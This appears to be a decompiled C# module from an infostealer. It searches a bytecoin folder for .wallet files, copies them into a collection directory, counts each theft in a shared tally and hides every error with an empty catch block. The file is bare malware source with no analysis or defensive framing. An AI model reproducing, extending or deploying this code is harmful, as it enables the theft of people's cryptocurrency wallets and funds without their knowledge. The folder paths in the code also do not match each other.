using System.IO;

internal class Class63
{
	public static int int_0;

	public static void smethod_0(string string_0)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Class38.string_3 + "\\bytecoin").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(string_0 + "\\Wallets\\Bytecoin\\");
				if (fileInfo.Extension.Equals(".wallet"))
				{
					fileInfo.CopyTo(string_0 + "\\Bytecoin\\" + fileInfo.Name);
				}
			}
			int_0++;
			Class36.int_12++;
		}
		catch
		{
		}
	}
}
